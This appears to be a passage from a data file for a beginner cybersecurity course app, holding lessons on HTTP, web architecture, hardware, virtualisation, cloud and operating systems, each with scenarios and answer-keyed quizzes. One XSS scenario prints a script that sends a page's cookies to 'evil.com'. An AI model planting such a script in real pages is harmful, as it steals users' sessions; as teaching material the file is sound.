          'HTTP is the stateless protocol used to transfer data over the web (usually port 80).',
          'Requests consist of a verb (GET, POST), a target path, headers, and an optional body.',
          'Servers reply with status codes: 2xx (Success), 3xx (Redirect), 4xx (Client Error), 5xx (Server Error).',
          'Cookies are sent via headers and are essential for maintaining session state across requests.'
        ],
        quiz: [
          {
            id: 'q-http-1',
            question: 'What is the main difference between HTTP and HTTPS?',
            type: 'text',
            correctAnswer: 'HTTPS encrypts the traffic using TLS/SSL',
            hint: 'One is cleartext, the other is secure.'
          },
          {
            id: 'q-http-2',
            question: 'What is the difference between a GET request and a POST request?',
            type: 'text',
            correctAnswer: 'GET retrieves data, POST submits data',
            hint: 'GET puts parameters in the URL, POST puts them in the body.'
          },
          {
            id: 'q-http-3',
            question: 'What does a 401 HTTP status code mean?',
            type: 'text',
            correctAnswer: 'Unauthorized (requires authentication)',
            hint: 'You must log in to view this.'
          },
          {
            id: 'q-http-4',
            question: 'What does a 403 HTTP status code mean?',
            type: 'text',
            correctAnswer: 'Forbidden (access denied)',
            hint: 'You are logged in, but you lack permissions.'
          },
          {
            id: 'q-http-5',
            question: 'Why does HTTP use Cookies?',
            type: 'text',
            correctAnswer: 'To maintain state and session data',
            hint: 'HTTP is inherently stateless without them.'
          }
        ]
      },
      {
        id: 'how-websites-work',
        moduleId: 'how-the-web-works',
        title: 'How Websites Work',
        description: 'Frontend vs Backend, HTML, CSS, JavaScript, and Injection.',
        status: 'unlocked',
        iconType: 'web',
        content: '',
        realWorldCallout: {
          title: 'The Stolen Session',
          concept: 'Cross-Site Scripting (XSS)',
          scenario: 'A developer fails to sanitize user input on a blog comment section. An attacker submits a comment containing a malicious JavaScript payload <script>fetch("http://evil.com?c="+document.cookie)</script>. When the admin views the page, the browser executes the script and steals their session cookie.',
          relevance: 'Demonstrates the critical boundary between backend data storage and frontend rendering, and why trusting client-side execution can lead to severe compromises.'
        },
        mindmap: [
          { id: 'web-root', label: 'Web Architecture', description: 'Client-Server Model', x: 50, y: 15, connections: ['frontend', 'backend'] },
          { id: 'frontend', label: 'Frontend', description: 'HTML, CSS, JS', x: 20, y: 50 },
          { id: 'backend', label: 'Backend', description: 'Server, Database, Logic', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'Websites are built on HTML (structure), CSS (styling), and JavaScript (interactivity).',
          'The Frontend (client-side) executes in the browser and is fully visible to the user.',
          'The Backend (server-side) handles databases, authentication, and core business logic.',
          'Injection vulnerabilities (like HTML or XSS) occur when untrusted user input is rendered directly into the DOM.'
        ],
        quiz: [
          {
            id: 'q-web-1',
            question: 'What are the three core languages of the Frontend web?',
            type: 'text',
            correctAnswer: 'HTML, CSS, JavaScript',
            hint: 'Structure, Style, Interactivity.'
          },
          {
            id: 'q-web-2',
            question: 'What does HTML provide to a webpage?',
            type: 'text',
            correctAnswer: 'The structural layout and content',
            hint: 'It defines headings, paragraphs, and images.'
          },
          {
            id: 'q-web-3',
            question: 'Where does JavaScript execute in a standard web application?',
            type: 'text',
            correctAnswer: 'In the user\'s browser (client-side)',
            hint: 'This is why you can view its source code.'
          },
          {
            id: 'q-web-4',
            question: 'What is an injection vulnerability?',
            type: 'text',
            correctAnswer: 'When untrusted user input is executed as code',
            hint: 'Examples include SQLi or XSS.'
          },
          {
            id: 'q-web-5',
            question: 'What is the role of the Backend?',
            type: 'text',
            correctAnswer: 'To handle databases, authentication, and core logic',
            hint: 'It runs on the server, hidden from the user.'
          }
        ]
      },
      {
        id: 'putting-it-all-together',
        moduleId: 'how-the-web-works',
        title: 'Putting it all together',
        description: 'The complete lifecycle of a website request from DNS to render.',
        status: 'unlocked',
        iconType: 'web',
        content: '',
        realWorldCallout: {
          title: 'The Silent Redirect',
          concept: 'Full Request Flow Compromise',
          scenario: 'An attacker breaches a company\'s load balancer configuration. They silently modify the routing rules so that any HTTP request containing the "/checkout" URI path is routed to a rogue server that skims credit card details before forwarding the request to the legitimate backend.',
          relevance: 'Shows that a web request touches many components (DNS, Load Balancers, WAFs, Web Servers, Databases) and a compromise at any layer can break the entire application.'
        },
        mindmap: [
          { id: 'lifecycle-root', label: 'Request Lifecycle', description: 'End-to-End Flow', x: 50, y: 15, connections: ['dns-waf', 'lb-server'] },
          { id: 'dns-waf', label: 'Edge Layer', description: 'DNS, CDN, WAF', x: 20, y: 50 },
          { id: 'lb-server', label: 'Core Infrastructure', description: 'Load Balancer, Web Server, DB', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'A web request involves DNS resolution, TCP handshake, HTTP request transmission, and server processing.',
          'Load balancers distribute traffic across multiple web servers to handle high load and prevent downtime.',
          'Web Application Firewalls (WAF) inspect incoming HTTP requests and block malicious payloads like SQLi.',
          'The browser parses the final HTML response and initiates secondary requests for CSS, JS, and images to construct the DOM.'
        ],
        quiz: [
          {
            id: 'q-put-1',
            question: 'What is the first step when a user types a URL into their browser?',
            type: 'text',
            correctAnswer: 'DNS Resolution',
            hint: 'The browser needs to find the IP address first.'
          },
          {
            id: 'q-put-2',
            question: 'What does a Load Balancer do?',
            type: 'text',
            correctAnswer: 'Distributes incoming traffic across multiple servers',
            hint: 'Prevents any single server from becoming overwhelmed.'
          },
          {
            id: 'q-put-3',
            question: 'What is the purpose of a WAF (Web Application Firewall)?',
            type: 'text',
            correctAnswer: 'Inspects HTTP traffic for malicious payloads',
            hint: 'It blocks attacks like SQL Injection and XSS before they hit the server.'
          },
          {
            id: 'q-put-4',
            question: 'Why do browsers make secondary requests after receiving the initial HTML?',
            type: 'text',
            correctAnswer: 'To fetch linked assets like CSS, JS, and images',
            hint: 'The HTML only provides the structure, not the media.'
          }
        ]
      },
      {
        id: 'mystery-chest',
        moduleId: 'how-the-web-works',
        title: 'Mystery Chest',
        description: 'Rapid Revision and Exam Tips',
        status: 'unlocked',
        iconType: 'shield',
        content: '',
        realWorldCallout: {
          title: 'Rapid Triage',
          concept: 'Incident Response Context',
          scenario: 'A SOC alert fires indicating excessive 404 and 500 HTTP status codes originating from a single IP. Using knowledge of web mechanics, the analyst quickly identifies this as an automated directory brute-force attack (DirBuster) attempting to find hidden admin panels.',
          relevance: 'Knowing the intricacies of DNS, HTTP, and web architecture allows defenders to instantly recognize anomalous patterns and map them to specific attack vectors.'
        },
        mindmap: [
          { id: 'chest-root', label: 'Mystery Chest', description: 'Rapid Revision', x: 50, y: 50 }
        ],
        keyTakeaways: [
          'A thorough understanding of "How The Web Works" is the foundation for all web application penetration testing.',
          'DNS controls where traffic goes, HTTP carries the data, and HTML/JS renders the interface.',
          'Attackers look for weaknesses in state management (cookies), input validation (XSS), and logic flaws.',
          'Mastering these core mechanics is essential before progressing to advanced Web Hacking modules.'
        ],
        quiz: [
          {
            id: 'q-chest-web-1',
            question: 'Which component is responsible for remembering your login session?',
            type: 'text',
            correctAnswer: 'Cookies / Session Tokens',
            hint: 'Stored in the browser and sent with every request.'
          },
          {
            id: 'q-chest-web-2',
            question: 'What tool can an attacker use to intercept and modify HTTP requests in transit?',
            type: 'text',
            correctAnswer: 'An interception proxy like Burp Suite',
            hint: 'It sits between the browser and the server.'
          },
          {
            id: 'q-chest-web-3',
            question: 'Which status code indicates a server-side error (e.g. database crash)?',
            type: 'text',
            correctAnswer: '500 Internal Server Error',
            hint: 'Starts with a 5.'
          },
          {
            id: 'q-chest-web-4',
            question: 'Why is client-side validation not sufficient for security?',
            type: 'text',
            correctAnswer: 'Because attackers can bypass the frontend and send raw HTTP requests',
            hint: 'Never trust the client.'
          }
        ]
      }
    ]
  },
  {
    id: 'computer-fundamentals',
    title: 'Computer Fundamentals',
    description: 'Understand core hardware, computer types, client-server architecture, virtualization, and cloud computing.',
    topics: [
      {
        id: 'inside-a-computer-system',
        moduleId: 'computer-fundamentals',
        title: 'Inside a Computer System',
        description: 'Learn about the main hardware components of a computer, the boot process, and the difference between BIOS and UEFI.',
        status: 'unlocked',
        iconType: 'clipboard',
        content: '',
        realWorldCallout: {
          title: 'The Overheating Server',
          concept: 'Hardware Component Roles & Boot Process',
          scenario: 'A company\'s web server suddenly goes offline. The IT team discovers the PSU fan has failed, causing the CPU to overheat and trigger a thermal shutdown. The POST check fails on subsequent restarts until the PSU is replaced, and the UEFI logs reveal the exact thermal fault.',
          relevance: 'Understanding each hardware component\'s role — especially PSU, CPU thermals, and firmware diagnostics — is critical for troubleshooting real server outages.'
        },
        mindmap: [
          { id: 'comp-sys-root', label: 'Computer System', description: 'Core hardware architecture of a PC', x: 50, y: 15, connections: ['cpu-node', 'ram-node', 'storage-node', 'boot-node'] },
          { id: 'cpu-node', label: 'CPU', description: 'Brain — Fetch, Decode, Execute cycle', x: 15, y: 50 },
          { id: 'ram-node', label: 'RAM', description: 'Volatile temporary working memory', x: 38, y: 55 },
          { id: 'storage-node', label: 'Storage', description: 'Permanent: SSD (flash) vs HDD (magnetic)', x: 62, y: 55 },
          { id: 'boot-node', label: 'Boot Process', description: 'PSU → UEFI/BIOS → POST → Bootloader → OS', x: 85, y: 50 }
        ],
        keyTakeaways: [
          'Motherboard connects all components.',
          'CPU executes instructions.',
          'RAM stores temporary data — volatile.',
          'SSD/HDD store permanent data.',
          'GPU renders graphics.',
          'PSU powers the computer.',
          'UEFI initializes hardware; POST checks hardware health.',
          'Bootloader loads the Operating System.',
          'Boot sequence: Power → Firmware → POST → Boot Device → Bootloader → OS.'
        ],
        quiz: [
          {
            id: 'q-ics-1',
            question: 'What type of memory loses all data when power is turned off?',
            type: 'text',
            correctAnswer: 'RAM',
            hint: 'It stands for Random Access Memory and is volatile.'
          },
          {
            id: 'q-ics-2',
            question: 'What does POST stand for?',
            type: 'text',
            correctAnswer: 'Power-On Self Test',
            hint: 'It checks hardware health during boot.'
          },
          {
            id: 'q-ics-3',
            question: 'Which modern firmware replaced BIOS and supports Secure Boot?',
            type: 'text',
            correctAnswer: 'UEFI',
            hint: 'Unified Extensible Firmware Interface.'
          },
          {
            id: 'q-ics-4',
            question: 'What component converts AC to DC power for the computer?',
            type: 'text',
            correctAnswer: 'PSU',
            hint: 'Power Supply Unit.'
          },
          {
            id: 'q-ics-5',
            question: 'Which storage interface offers speeds of 3500-7000 MB/s?',
            type: 'text',
            correctAnswer: 'NVMe',
            hint: 'Much faster than SATA.'
          }
        ]
      },
      {
        id: 'computer-types',
        moduleId: 'computer-fundamentals',
        title: 'Computer Types',
        description: 'Learn about 8 types of computers: Laptop, Desktop, Workstation, Server, Smartphone, Tablet, IoT, and Embedded.',
        status: 'unlocked',
        iconType: 'clipboard',
        content: '',
        realWorldCallout: {
          title: 'The Smart Thermostat Hack',
          concept: 'IoT & Embedded Device Security',
          scenario: 'An attacker compromises a smart thermostat (IoT device) in a casino through its internet connection. Because the thermostat was on the same network as the high-roller database, the attacker pivoted laterally and exfiltrated 10GB of customer data through the thermostat\'s outbound connection.',
          relevance: 'Different computer types have different security postures. IoT and embedded devices are often the weakest link because they lack proper patching and monitoring.'
        },
        mindmap: [
          { id: 'comp-types-root', label: 'Computer Types', description: '8 categories of computing devices', x: 50, y: 10, connections: ['personal-node', 'enterprise-node', 'hidden-node'] },
          { id: 'personal-node', label: 'Personal', description: 'Laptop, Desktop, Smartphone, Tablet', x: 20, y: 45 },
          { id: 'enterprise-node', label: 'Enterprise', description: 'Workstation, Server', x: 50, y: 50 },
          { id: 'hidden-node', label: 'Hidden', description: 'IoT, Embedded Computer', x: 80, y: 45 }
        ],
        keyTakeaways: [
          'Computers exist everywhere, not just on desks.',
          'Laptops prioritize portability.',
          'Desktops prioritize sustained performance.',
          'Workstations prioritize precision and reliability.',
          'Servers provide services to multiple users 24×7.',
          'IoT devices communicate over networks for automation.',
          'Embedded computers quietly control machines internally.',
          'Every design is a trade-off between performance, cost, power, portability, and reliability.'
        ],
        quiz: [
          {
            id: 'q-ct-1',
            question: 'Which computer type is best suited for professional CAD and 3D rendering work?',
            type: 'text',
            correctAnswer: 'Workstation',
            hint: 'Uses specialized hardware with error correction.'
          },
          {
            id: 'q-ct-2',
            question: 'What type of hidden computer controls a coffee machine?',
            type: 'text',
            correctAnswer: 'Embedded Computer',
            hint: 'Performs one dedicated task inside another machine.'
          },
          {
            id: 'q-ct-3',
            question: 'Which computer type typically runs 24×7 with no monitor and serves many users?',
            type: 'text',
            correctAnswer: 'Server',
            hint: 'Managed remotely over a network.'
          },
          {
            id: 'q-ct-4',
            question: 'What distinguishes IoT from embedded computers?',
            type: 'text',
            correctAnswer: 'IoT connects to the Internet',
            hint: 'IoT = Internet of Things.'
          }
        ]
      },
      {
        id: 'client-server-basics',
        moduleId: 'computer-fundamentals',
        title: 'Client-Server Basics',
        description: 'Understand the client-server model, protocols, ports, DNS, HTTP methods, and status codes.',
        status: 'unlocked',
        iconType: 'network',
        content: '',
        realWorldCallout: {
          title: 'DNS Hijacking Attack',
          concept: 'DNS & Client-Server Communication',
          scenario: 'An attacker compromises a home router and changes its DNS settings to point to a malicious server. When users type "bank.com", the DNS resolves to the attacker\'s IP instead. Users unknowingly enter their credentials on a fake login page — a classic pharming attack.',
          relevance: 'Understanding how DNS, ports, and HTTP work is essential to recognizing when the client-server chain is compromised.'
        },
        mindmap: [
          { id: 'cs-root', label: 'Client-Server', description: 'Foundation of Internet communication', x: 50, y: 10, connections: ['client-node', 'server-node', 'protocol-node'] },
          { id: 'client-node', label: 'Client', description: 'Sends requests (Browser, App)', x: 15, y: 45 },
          { id: 'server-node', label: 'Server', description: 'Responds with resources', x: 50, y: 50 },
          { id: 'protocol-node', label: 'Protocols', description: 'HTTP, HTTPS, DNS, FTP, SSH', x: 85, y: 45 },
          { id: 'port-node', label: 'Ports', description: '80 (HTTP), 443 (HTTPS), 22 (SSH), 53 (DNS)', x: 35, y: 80, connections: [] },
          { id: 'dns-node', label: 'DNS', description: 'Domain Name → IP Address', x: 65, y: 80, connections: [] }
        ],
        keyTakeaways: [
          'Client requests, Server responds.',
          'Protocol = Communication rules.',
          'DNS converts domain names into IP addresses.',
          'Port identifies a specific service on a server.',
          'HTTP transfers webpages (port 80). HTTPS is secure (port 443).',
          'HTTP is Stateless — Cookies and Sessions maintain state.',
          'GET retrieves data, POST sends data.',
          'URL = Scheme + Host + Path.',
          'Browser Developer Tools (Network tab) show every request and response.'
        ],
        quiz: [
          {
            id: 'q-csb-1',
            question: 'What identifies a specific service on a server?',
            type: 'text',
            correctAnswer: 'Port',
            hint: 'Like a door in a building — each leads to a different service.'
          },
          {
            id: 'q-csb-2',
            question: 'What is the default port for HTTPS?',
            type: 'text',
            correctAnswer: '443',
            hint: 'The secure version of HTTP.'
          },
          {
            id: 'q-csb-3',
            question: 'What converts human-readable domain names into IP addresses?',
            type: 'text',
            correctAnswer: 'DNS',
            hint: 'Domain Name System.'
          },
          {
            id: 'q-csb-4',
            question: 'What HTTP status code means "Not Found"?',
            type: 'text',
            correctAnswer: '404',
            hint: 'The most well-known error code.'
          },
          {
            id: 'q-csb-5',
            question: 'What HTTP method is used to create or submit data?',
            type: 'text',
            correctAnswer: 'POST',
            hint: 'Used for login, signup, form submission.'
          }
        ]
      },
      {
        id: 'virtualisation-basics',
        moduleId: 'computer-fundamentals',
        title: 'Virtualisation Basics',
        description: 'Learn about virtual machines, hypervisors (Type 1 & 2), containers, Docker, and VM management.',
        status: 'unlocked',
        iconType: 'clipboard',
        content: '',
        realWorldCallout: {
          title: 'VM Escape Vulnerability',
          concept: 'Virtualization Security & Isolation',
          scenario: 'A security researcher discovers a vulnerability in a hypervisor that allows a malicious VM guest to execute code on the host system — a "VM escape." This breaks the isolation boundary, potentially compromising all other VMs on the same physical server. Cloud providers like AWS immediately patch their hypervisors.',
          relevance: 'Virtualization relies on hypervisor isolation. A VM escape is one of the most critical vulnerabilities in cloud and datacenter environments.'
        },
        mindmap: [
          { id: 'virt-root', label: 'Virtualization', description: 'Multiple VMs on one physical server', x: 50, y: 10, connections: ['hyper-node', 'vm-node', 'container-node'] },
          { id: 'hyper-node', label: 'Hypervisor', description: 'Type 1 (Bare Metal) vs Type 2 (Hosted)', x: 20, y: 50 },
          { id: 'vm-node', label: 'Virtual Machine', description: 'Own OS, Strong isolation, GB-sized', x: 50, y: 55 },
          { id: 'container-node', label: 'Container', description: 'Shared kernel, Lightweight, MB-sized', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'Virtualization runs multiple VMs on one physical server.',
          'Hypervisor creates, manages and allocates resources to VMs.',
          'Type 1 Hypervisor runs directly on hardware (production).',
          'Type 2 Hypervisor runs on Host OS (learning, labs).',
          'VMs have their own OS — stronger isolation, heavier.',
          'Containers share the Host Kernel — lighter, faster.',
          'Docker is the most popular container platform.',
          'VM management involves monitoring states, resources and host health.',
          'Virtualization saves cost through better hardware utilization.'
        ],
        quiz: [
          {
            id: 'q-vb-1',
            question: 'What software creates and manages Virtual Machines?',
            type: 'text',
            correctAnswer: 'Hypervisor',
            hint: 'It divides one physical server into multiple virtual ones.'
          },
          {
            id: 'q-vb-2',
            question: 'Which hypervisor type is best for a student doing Cyber Security labs?',
            type: 'text',
            correctAnswer: 'Type 2',
            hint: 'Runs inside an existing OS like Windows or macOS.'
          },
          {
            id: 'q-vb-3',
            question: 'What is lighter — a Virtual Machine or a Container?',
            type: 'text',
            correctAnswer: 'Container',
            hint: 'Shares the Host OS Kernel, boots in seconds, MB-sized.'
          },
          {
            id: 'q-vb-4',
            question: 'What does virtualization enable multiple applications to share?',
            type: 'text',
            correctAnswer: 'physical server',
            hint: 'The whole point is sharing one machine.'
          },
          {
            id: 'q-vb-5',
            question: 'Which provides better isolation — VM or Container?',
            type: 'text',
            correctAnswer: 'Virtual Machine',
            hint: 'It has its own full Operating System.'
          }
        ]
      },
      {
        id: 'cloud-computing-fundamentals',
        moduleId: 'computer-fundamentals',
        title: 'Cloud Computing Fundamentals',
        description: 'Learn about cloud service models (IaaS, PaaS, SaaS), deployment models, regions, and cloud billing.',
        status: 'unlocked',
        iconType: 'clipboard',
        content: '',
        realWorldCallout: {
          title: 'The Capital One Breach',
          concept: 'Cloud Security Misconfiguration',
          scenario: 'In 2019, an attacker exploited a misconfigured Web Application Firewall (WAF) on AWS to access an S3 bucket containing personal data of over 100 million Capital One customers. The root cause was an overly permissive IAM role attached to the WAF, allowing it to read from S3.',
          relevance: 'Cloud computing is powerful but shared responsibility means misconfigurations in IaaS/PaaS can expose massive amounts of data. Understanding cloud models is essential for security.'
        },
        mindmap: [
          { id: 'cloud-root', label: 'Cloud Computing', description: 'On-demand computing resources delivered over the internet, pay-as-you-go instead of owning hardware.', x: 50, y: 10, connections: ['service-models', 'deploy-models', 'regions-az', 'providers-node'] },
          { id: 'service-models', label: 'Service Models', description: 'IaaS (raw infrastructure), PaaS (platform for apps), SaaS (ready-to-use software).', x: 20, y: 45, connections: ['shared-resp'] },
          { id: 'shared-resp', label: 'Shared Responsibility', description: 'Provider secures the cloud (hardware, hypervisor, facilities); you secure what you put in it (data, config, IAM).', x: 15, y: 78, connections: ['cloud-security'] },
          { id: 'cloud-security', label: 'Cloud Security', description: 'Misconfiguration is the #1 cause of cloud breaches: public buckets, over-permissive IAM roles, open firewalls.', x: 30, y: 95 },
          { id: 'deploy-models', label: 'Deployment Models', description: 'Public (shared), Private (dedicated), Hybrid (both), Community (shared by similar orgs).', x: 45, y: 50 },
          { id: 'regions-az', label: 'Regions & AZs', description: 'A Region is a geographic area; Availability Zones are isolated data centers within it for redundancy.', x: 70, y: 45, connections: ['billing-node'] },
          { id: 'billing-node', label: 'Billing', description: 'Pay-as-you-go (on-demand), Reserved (commit for a discount), or Spot (cheap spare capacity).', x: 72, y: 78 },
          { id: 'providers-node', label: 'Providers', description: 'AWS (market leader), Azure (enterprise/Windows), GCP (data, AI, Kubernetes).', x: 88, y: 50 }
        ],
        keyTakeaways: [
          'Cloud computing delivers resources over the internet on-demand.',
          'Cloud exists to replace costly, fixed on-prem hardware (CapEx) with flexible pay-as-you-go resources (OpEx).',
          'IaaS = raw infrastructure (VMs, storage, networking).',
          'PaaS = platform for building apps (no server management).',
          'SaaS = ready-to-use software (Gmail, Office 365).',
          'Public cloud is shared; Private cloud is dedicated; Hybrid combines both.',
          'Regions provide geographic redundancy; Availability Zones protect against datacenter failure.',
          'Cloud billing is pay-as-you-go.',
          'Shared Responsibility: the provider secures the cloud; you secure your data, config, and access (IAM).',
          'Misconfiguration (public buckets, over-permissive IAM roles) is the #1 cause of cloud breaches.',
          'Major providers: AWS, Azure, GCP.'
        ],
        quiz: [
          {
            id: 'q-ccf-1',
            question: 'Which cloud service model gives you raw VMs and storage to manage yourself?',
            type: 'text',
            correctAnswer: 'IaaS',
            hint: 'Infrastructure as a Service.'
          },
          {
            id: 'q-ccf-2',
            question: 'Gmail and Office 365 are examples of which cloud service model?',
            type: 'text',
            correctAnswer: 'SaaS',
            hint: 'Software as a Service — ready to use.'
          },
          {
            id: 'q-ccf-3',
            question: 'What cloud deployment model combines public and private clouds?',
            type: 'text',
            correctAnswer: 'Hybrid',
            hint: 'Best of both worlds.'
          },
          {
            id: 'q-ccf-4',
            question: 'What protects against a single data center failure within a cloud region?',
            type: 'text',
            correctAnswer: 'Availability Zone',
            hint: 'Multiple isolated locations within one region.'
          },
          {
            id: 'q-ccf-5',
            question: 'In the Shared Responsibility Model, who secures your data and access settings?',
            type: 'text',
            correctAnswer: 'The customer (you). The provider secures the infrastructure (hardware, hypervisor, facilities); you secure your data, configuration, and IAM.',
            hint: 'The provider secures the cloud; you secure what you put in it.'
          }
        ]
      },
      {
        id: 'mystery-chest-comp',
        moduleId: 'computer-fundamentals',
        title: 'Mystery Chest',
        description: 'Module 4 Key Takeaways — consolidates all concepts from Computer Fundamentals.',
        status: 'unlocked',
        iconType: 'mystery-chest',
        content: '',
        realWorldCallout: {
          title: 'Full Stack Outage',
          concept: 'Computer Fundamentals in Practice',
          scenario: 'A startup experiences a complete outage: their cloud VM (IaaS) crashes due to a hypervisor bug, the DNS failover is misconfigured, and the embedded IoT sensors in their warehouse stop reporting. The team that understands hardware, networking, virtualization, and cloud recovers in hours — the team that doesn\'t takes days.',
          relevance: 'Computer Fundamentals isn\'t just theory. Every layer — hardware, networking, virtualization, cloud — must work together, and understanding all of them makes you a better security professional.'
        },
        mindmap: [
          { id: 'mod4-root', label: 'Computer Fundamentals', description: 'Full module overview', x: 50, y: 10, connections: ['hw-recap', 'types-recap', 'cs-recap', 'virt-recap', 'cloud-recap'] },
          { id: 'hw-recap', label: 'Hardware', description: 'CPU, RAM, Storage, GPU, PSU, Boot', x: 10, y: 50 },
          { id: 'types-recap', label: 'Types', description: '8 computer types & trade-offs', x: 28, y: 55 },
          { id: 'cs-recap', label: 'Client-Server', description: 'Protocols, Ports, DNS, HTTP', x: 50, y: 55 },
          { id: 'virt-recap', label: 'Virtualization', description: 'Hypervisor, VMs, Containers', x: 72, y: 55 },
          { id: 'cloud-recap', label: 'Cloud', description: 'IaaS, PaaS, SaaS, Regions', x: 90, y: 50 }
        ],
        keyTakeaways: [
          'A computer\'s hardware includes CPU, RAM, Storage, GPU, PSU, and Network Adapter.',
          'Boot: Power → UEFI → POST → Boot Device → Bootloader → OS.',
          '8 computer types, each designed for a specific purpose with trade-offs.',
          'Client-Server model: Client requests → Server responds over protocols.',
          'DNS translates domain names to IPs. Ports identify services.',
          'Virtualization: Hypervisor → VMs. Containers share host kernel.',
          'Cloud: IaaS, PaaS, SaaS. Deploy as Public, Private, or Hybrid.',
          'Every layer — hardware to cloud — must work together in production.'
        ],
        quiz: [
          {
            id: 'q-mc4-1',
            question: 'What mnemonic helps remember the boot sequence? (Please Find Proper Boot Before...)',
            type: 'text',
            correctAnswer: 'Operating',
            hint: 'Please Find Proper Boot Before Operating.'
          },
          {
            id: 'q-mc4-2',
            question: 'Name the 3 cloud service models (comma separated).',
            type: 'text',
            correctAnswer: 'IaaS, PaaS, SaaS',
            hint: 'Infrastructure, Platform, Software.'
          },
          {
            id: 'q-mc4-3',
            question: 'What hypervisor type runs directly on hardware?',
            type: 'text',
            correctAnswer: 'Type 1',
            hint: 'Also called Bare Metal.'
          }
        ]
      }
    ]
  },
  {
    id: 'os-basics',
    title: 'Operating Systems Basics',
    description: 'Learn the fundamentals of Operating Systems, Windows and Linux CLI, and OS security concepts.',
    isFuture: false,
    topics: [
      {
        id: 'os-intro',
        moduleId: 'os-basics',
        title: 'Operating Systems: Introduction',
        description: 'Introduction to Operating Systems, Kernel vs User space, and system calls.',
        status: 'unlocked',
        iconType: 'os-intro',
        content: '',
        realWorldCallout: undefined,
        mindmap: [
          { id: 'os-root', label: 'Operating System', description: 'The invisible manager', x: 50, y: 15, connections: ['kernel', 'user', 'calls'] },
          { id: 'kernel', label: 'Kernel Space', description: 'High privilege operations', x: 20, y: 50 },
          { id: 'user', label: 'User Space', description: 'Application execution area', x: 50, y: 55 },
          { id: 'calls', label: 'System Calls', description: 'Bridge between user and kernel', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'The OS acts as the invisible manager between hardware and software.',
          'Kernel space is for highly privileged operations; user space is for applications.',
          'System calls are the bridge applications use to request hardware access.'
        ],
        quiz: [
          { id: 'q-os-1', question: 'What space do regular applications run in?', type: 'text', correctAnswer: 'user space', hint: 'Not the kernel.' },
          { id: 'q-os-2', question: 'What bridges user space and kernel space?', type: 'text', correctAnswer: 'system calls', hint: 'Applications "call" the system.' }
        ]
      },
      {
        id: 'win-basics',
        moduleId: 'os-basics',
        title: 'Windows Basics',
        description: 'Understand basic Windows configurations, updates, and settings.',
        status: 'locked',
        iconType: 'win-basics',
        content: '',
        realWorldCallout: undefined,
        mindmap: [
          { id: 'win-root', label: 'Windows', description: 'Microsoft Desktop OS', x: 50, y: 15, connections: ['settings', 'sec', 'tools'] },
          { id: 'settings', label: 'Settings', description: 'Control panel and updates', x: 20, y: 50 },
          { id: 'sec', label: 'Security', description: 'Defender and Firewall', x: 50, y: 55 },
          { id: 'tools', label: 'Admin Tools', description: 'Task manager and services', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'Windows Update is crucial for security patches.',
          'Control Panel provides granular access to system settings.',
          'Windows Defender is the built-in antivirus and firewall solution.'
        ],
        quiz: [
          { id: 'q-wb-1', question: 'What built-in tool provides antivirus protection in Windows?', type: 'text', correctAnswer: 'windows defender', hint: 'It "defends" Windows.' }
        ]
      },
      {
        id: 'linux-cli',
        moduleId: 'os-basics',
        title: 'Linux CLI Basics',
        description: 'Master essential Linux command line navigation and operations.',
        status: 'locked',
        iconType: 'linux-cli',
        content: '',
        realWorldCallout: undefined,
        mindmap: [
          { id: 'lin-root', label: 'Linux CLI', description: 'Terminal operations', x: 50, y: 15, connections: ['nav', 'info', 'files'] },
          { id: 'nav', label: 'Navigation', description: 'cd, ls, pwd', x: 20, y: 50 },
          { id: 'info', label: 'System Info', description: 'uname, whoami', x: 50, y: 55 },
          { id: 'files', label: 'File Ops', description: 'cat, find', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'Linux CLI provides powerful, scriptable control over the OS.',
          'Commands like ls, cd, and pwd are fundamental to navigation.',
          'The root user has ultimate authority over the system.'
        ],
        quiz: [
          { id: 'q-lc-1', question: 'What command prints your current directory path?', type: 'text', correctAnswer: 'pwd', hint: 'Print working directory' }
        ]
      },
      {
        id: 'win-cli',
        moduleId: 'os-basics',
        title: 'Windows CLI Basics',
        description: 'Learn the Windows command prompt for system administration.',
        status: 'locked',
        iconType: 'win-cli',
        content: '',
        realWorldCallout: undefined,
        mindmap: [
          { id: 'wincli-root', label: 'Windows CMD', description: 'Command Prompt', x: 50, y: 15, connections: ['nav', 'sys', 'net'] },
          { id: 'nav', label: 'Navigation', description: 'cd, dir', x: 20, y: 50 },
          { id: 'sys', label: 'System', description: 'systeminfo, whoami', x: 50, y: 55 },
          { id: 'net', label: 'Network', description: 'ipconfig', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'CMD allows direct interaction with the Windows filesystem.',
          'Systeminfo and whoami provide crucial reconnaissance data.',
          'ipconfig is essential for understanding network configuration.'
        ],
        quiz: [
          { id: 'q-wc-1', question: 'Which command lists files in the current directory in Windows?', type: 'text', correctAnswer: 'dir', hint: 'Short for directory.' }
        ]
      },
      {
        id: 'os-sec',
        moduleId: 'os-basics',
        title: 'Operating System Security',
        description: 'Understand OS security concepts, least privilege, and CIA triad.',
        status: 'locked',
        iconType: 'os-sec',
        content: '',
        realWorldCallout: undefined,
        mindmap: [
          { id: 'sec-root', label: 'OS Security', description: 'Securing the core', x: 50, y: 15, connections: ['cia', 'priv', 'auth'] },
          { id: 'cia', label: 'CIA Triad', description: 'Confidentiality, Integrity, Availability', x: 20, y: 50 },
          { id: 'priv', label: 'Least Privilege', description: 'Minimal necessary access', x: 50, y: 55 },
          { id: 'auth', label: 'Authentication', description: 'Strong passwords', x: 80, y: 50 }
        ],
        keyTakeaways: [
          'The CIA Triad is the foundation of information security.',
          'Always apply the Principle of Least Privilege.',
          'Strong authentication is the first line of defense against compromise.'
        ],
        quiz: [
          { id: 'q-ossec-1', question: 'What principle dictates giving users only the access they strictly need?', type: 'text', correctAnswer: 'least privilege', hint: 'The minimum amount.' }
        ]
      },
      {
        id: 'mystery-chest-os',
        moduleId: 'os-basics',
        title: 'Mystery Chest',
        description: 'Unlock bonus OS summaries and revision material.',
        status: 'locked',
        iconType: 'mystery-chest',
        content: '',
        realWorldCallout: undefined,
        mindmap: [
          { id: 'mc-root', label: 'Mystery Chest', description: 'Bonus Revision', x: 50, y: 25, connections: [] }
        ],
        keyTakeaways: ['Review all key concepts before moving on.'],
        quiz: []
      }
    ]
  },
  {
    id: 'software-basics',
    title: 'Software Basics',
    description: 'Understand data representation, encoding, Python scripting, JavaScript fundamentals, and database SQL basics.',
    topics: [
      {
        id: 'data-representation',
        moduleId: 'software-basics',
        title: 'Data Representation',
